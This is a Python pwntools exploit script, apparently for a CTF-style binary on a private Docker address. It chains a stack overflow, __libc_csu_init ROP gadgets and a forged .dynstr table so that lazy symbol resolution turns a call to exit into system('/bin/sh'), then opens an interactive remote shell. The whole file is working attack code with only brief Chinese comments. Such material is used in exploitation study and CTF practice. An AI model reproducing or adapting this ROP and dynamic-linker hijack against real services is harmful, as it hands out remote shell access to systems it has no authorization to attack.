#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

universal_gadget1 = 0x40060a	#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn
universal_gadget2 = 0x4005f0	#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]

pop_rdi_ret = 0x400613
call_exit_addr = 0x04005a5
read_got = 0x6009a0
start_addr = 0x400460
dynstr_d_ptr_address = 0x600828
fake_dynstr_address = 0x6009ec
fake_dynstr_data = "\x00libc.so.6\x00system\x00\x00\x00\x00\x00\x00read\x00__libc_start_main\x00__gmon_start__\x00GLIBC_2.2.5\x00"

io = remote("172.17.0.3", 10001)

payload = ""
payload += 'A'*18						#padding
payload += p64(universal_gadget1)
payload += p64(0x0)
payload += p64(0x1)						#rbp，随便设置
payload += p64(read_got)
payload += p64(0x8)
payload += p64(dynstr_d_ptr_address)
payload += p64(0x0)
payload += p64(universal_gadget2)
payload += 'A'*0x38						#栈修正
payload += p64(start_addr)							
io.send(payload)
sleep(0.5)
io.send(p64(fake_dynstr_address))		#新的.dynstr地址
sleep(0.5)

payload = ""
payload += 'A'*18						#padding
payload += p64(universal_gadget1)
payload += p64(0x0)
payload += p64(0x1)						#rbp，随便设置
payload += p64(read_got)
payload += p64(len(fake_dynstr_data)+8)
payload += p64(fake_dynstr_address)
payload += p64(0x0)
payload += p64(universal_gadget2)
payload += 'A'*0x38						#栈修正
payload += p64(start_addr)							
io.send(payload)
sleep(0.5)
io.send(fake_dynstr_data+"/bin/sh\x00")		#新的.dynstr地址
sleep(0.5)

payload = ""
payload += 'A'*18
payload += p64(pop_rdi_ret)
payload += p64(fake_dynstr_address+len(fake_dynstr_data))
payload += p64(call_exit_addr)			#伪造的.dynstr中exit被修改成了system，因此exit函数第一次被调用时函数重定位，顺着结构体找到了system，解析成system的首地址
io.send(payload)
io.interactive()